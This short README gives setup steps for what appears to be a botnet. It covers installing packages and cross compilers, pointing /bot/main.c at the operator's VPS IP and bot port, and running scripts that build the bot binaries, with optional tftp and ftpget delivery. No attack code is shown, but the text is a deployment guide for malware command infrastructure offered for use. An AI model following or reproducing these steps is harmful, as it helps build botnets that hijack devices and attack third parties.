# Requirements:
apt-get update -y
apt-get install screen -y
apt-get install gcc -y
apt-get install apache2 -y
apt-get install bzip2 -y
apt-get install sudo -y

# Steps:
Install cross compilers

# Bot steps
- Edit main.c in, to your vps ip and bot port you but in <botport> in /bot/main.c

chmod 777 *
./installccs.sh
./buildbot.sh
And that's all. too easy!
If you care enough about tftp and ftpget you can setup them

## ## ## WORKS WITH ALMA/ANY REDHAT ## ## ##